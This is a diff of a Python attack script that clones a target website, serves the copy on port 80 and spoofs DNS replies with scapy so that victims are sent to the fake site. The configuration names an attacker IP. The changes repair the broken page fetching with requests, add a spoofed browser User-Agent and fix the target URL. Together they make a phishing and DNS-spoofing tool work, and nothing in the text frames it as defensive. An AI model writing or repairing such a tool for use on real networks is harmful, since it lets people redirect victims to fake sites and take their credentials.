@@ -1,12 +1,11 @@
 import os
-import http.client
+import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
 from http.server import SimpleHTTPRequestHandler
 import socketserver
 from threading import Thread
 from scapy.all import *
-from requests_test import http_get, https_get
 
 # Configuration
 attacker_ip = "192.168.2.2"  # Replace with your actual IP address
@@ -18,7 +17,8 @@ def clone_website(url, save_dir):
     if not os.path.exists(save_dir):
         os.makedirs(save_dir)
 
-    response = http_get, https_get(url, '/')
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36'}
+    response = requests.get(url, headers=headers)
     soup = BeautifulSoup(response.text, 'html.parser')
 
     # Save the main page
@@ -34,11 +34,11 @@ def clone_website(url, save_dir):
             resource_path = os.path.join(save_dir, os.path.basename(urlparse(src_url).path))
             # Fetch and save resource
             try:
-                res = http_get, https_get(src_url, '/')
+                res = requests.get(src_url)
                 with open(resource_path, 'wb') as res_file:
                     res_file.write(res.content)
                 print(f"Downloaded: {src_url}")
-            except Exception as e:
+            except requests.RequestException as e:
                 print(f"Failed to download {src_url}: {e}")
 
     print("Website cloning completed.")
@@ -68,7 +68,7 @@ def dns_spoof(pkt):
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
 
 # Clone the website
-clone_website(target_domain, cloned_site_dir)
+clone_website(f"http://{target_domain}", cloned_site_dir)
 
 # Start the web server in a separate thread
 web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
